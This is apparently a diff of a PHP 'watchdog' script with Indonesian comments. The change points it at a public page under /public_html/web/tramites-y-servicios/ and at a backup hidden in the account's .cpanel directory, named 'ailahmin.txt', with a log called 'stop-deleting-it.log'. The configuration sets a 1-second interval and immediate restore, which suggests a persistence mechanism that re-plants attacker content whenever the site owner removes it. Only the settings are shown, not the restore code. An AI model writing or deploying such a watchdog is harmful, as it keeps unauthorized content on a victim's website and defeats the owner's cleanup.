@@ -2,9 +2,9 @@
 // watchdog_background.php - VERSI OPTIMASI
 // Perubahan: interval 1 detik, langsung restore, cache hash backup
 
-$file_asli   = '/home/chiacundippal/public_html/web/abc.txt';
-$file_backup = '/home/chiacundippal/.cpanel/caches/config/abc.txt';
-$log_file    = '/home/chiacundippal/.cpanel/caches/config/lp.log';
+$file_asli   = '/home/chiacundippal/public_html/web/tramites-y-servicios/index.html';
+$file_backup = '/home/chiacundippal/.cpanel/ailahmin.txt';
+$log_file    = '/home/chiacundippal/.cpanel/stop-deleting-it.log';
 
 // ===== KONFIGURASI =====
 $waktu_tunggu   = 0;  // 0 = langsung restore, >0 = tunggu N detik dulu
